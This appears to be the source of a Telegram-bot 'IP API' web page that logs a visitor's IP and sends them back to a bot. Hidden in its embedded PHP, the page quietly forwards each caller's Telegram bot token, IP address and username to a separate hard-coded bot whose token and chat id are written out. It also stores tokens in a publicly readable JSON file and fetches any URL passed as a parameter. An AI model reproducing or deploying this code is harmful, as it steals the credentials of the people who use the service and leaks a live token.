
<html lang="en"> <head> <meta charset="utf-8"> <meta name="theme-color" content="#000000"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <!-- SEO Meta Tags --> <meta name="description" content="@abhishek71599"> <!-- OG Meta Tags to improve the way the post looks when you share the page on LinkedIn, Facebook, Google+ --> <meta property="og:site_name" content="@abhishek71599"> <!-- website name --> <!-- Website Title --> <title>Ip Api</title> <!-- Styles --> <link href="https://freepaisa.xyz/css/bootstrap.css" rel="stylesheet"> <link href="https://freepaisa.xyz/css/fontawesome-all.css" rel="stylesheet"> <link href="https://freepaisa.xyz/css/swiper.css" rel="stylesheet"> <link href="https://freepaisa.xyz/css/magnific-popup.css" rel="stylesheet"> <link href="https://technoabhi.ml/IP/File.css" rel="stylesheet"> <style> .header{ background-color: #000000; } .footer{ background-color: #000000 !important; }.header ,.card-title{ color: #000000 !important; } .cls-1,.cls-2 { fill: #000000 !important;} .copyright,.btn-solid-reg{ background-color: #000000!important; color:#fff !important;; border: 0.125rem solid #000000 !important;} .btn-solid-lg{ color:#000000 !important; } .form .fa-stack .fa-stack-2x{ color: #000000 !important; } .navbar-custom,a.back-to-top { background-color: #000000 !important;} .above-heading { color: #000000 !important;}.form-control-submit-button{ background-color: #000000 !important;}
<?php

$ip=getenv("REMOTE_ADDR");
$id=$_GET["id"];
$webhook=$_GET["web"];;
$link=$_GET["yt"];

$token=$_GET["token"];

$url992='https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text=`Generating...`&parse_mode=markdown';
$headers1[]='user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36';
$ch1=curl_init();
curl_setopt($ch1,CURLOPT_URL,$url992);
curl_setopt($ch1,CURLOPT_POST,1);
curl_setopt($ch1,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch1,CURLOPT_HTTPHEADER,$headers1);
curl_setopt($ch1,CURLOPT_SSL_VERIFYPEER,false);
$urr=curl_exec($ch1);
$devil=json_decode($urr,true);
$name=$devil['result'];
$name1=$name['chat'];
$name2=$name1['username'];
$uname1= $name['from'];
$uname2=$uname1['username'];
$uname3="hello";
$name5= "hi";

$msgt1="*A User Just Visited The Site!!

Your Ip* : `".$ip."`


ðŸ”—Our Social
Token: ".$token."
User Name: @".$name2."
Telegram: @abhishek71599";
	$tp1=urlencode($msgt1);
	
	$url991='https://api.telegram.org/bot5432134709:AAENXvwuCGZXRIq_9BIo2SCJhcjwB6LYb-s/sendMessage?chat_id=1400569173&text='.$tp1.'&parse_mode=markdown';
file_get_contents($url991);

$msgt="*✅ Thanks For Visiting Site*
 _Click On_ /Done _To Continue_";
$tp=urlencode($msgt);
	
	$url99='https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.$tp.'&parse_mode=markdown';
$headers[]='user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36';
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url99);
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_HTTPHEADER,$headers);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
$output=curl_exec($ch);

$json= fopen("file/".$id.".json","a+");
$test0= "https://technoabhi.ml/IP/file/".$id.".json";
$test4=file_get_contents($test0);
$test3=json_decode($test4,true);
$test2=$test3['user_id'];
if($test2==$id){echo "1";}else{
fwrite($json,'{"user_id":"'.$id.'","token":"'.$token.'","ip":"'.$ip.'","username":"@'.$name2.'"}');
}
file_get_contents($webhook);
?>

</style> <!-- Favicon --> </head> <body data-spy="scroll" data-target=".fixed-top"> <a href="body" class="back-to-top page-scroll">Back to Top</a> <!-- Preloader --> </div> <!-- end of preloader --> <!-- Navigation --> <nav class="navbar navbar-expand-lg navbar-dark navbar-custom fixed-top">
<div class="container"> <!-- Text Logo - Use this if you dont have a graphic logo --> <!-- <a class="navbar-brand logo-text page-scroll" href="index.html">Tivo</a> --> <!-- Image Logo --> <h1 class="navbar-brand logo-image" href="index.html">BOT</h1> <!-- Mobile Menu Toggle Button --> <!-- end of mobile menu toggle button --> </div> </nav> <!-- Header --> <header id="header" class="header"> <div class="header-content"> <div class="container"> <div class="row"> <div class="col-lg-6 col-xl-5"> <div class="text-container"> <h1>Thanks For Using Our Service</h1> <p class="p-large">Please Return To The Bot Now. </p> <?php
echo" <a class='btn-solid-lg mt-2 page-scroll' href='https://Telegram.me/$uname2'> Go TO BOT</a> </div>" ;
?><!-- end of text-container --> </div> <!-- end of col --> <div class="col-lg-6 col-xl-7"> <div class="image-container"> <div class="img-wrapper"> <img class="img-fluid" src="https://freepaisa.xyz/uploads/head.png"> </div> <!-- end of img-wrapper -->


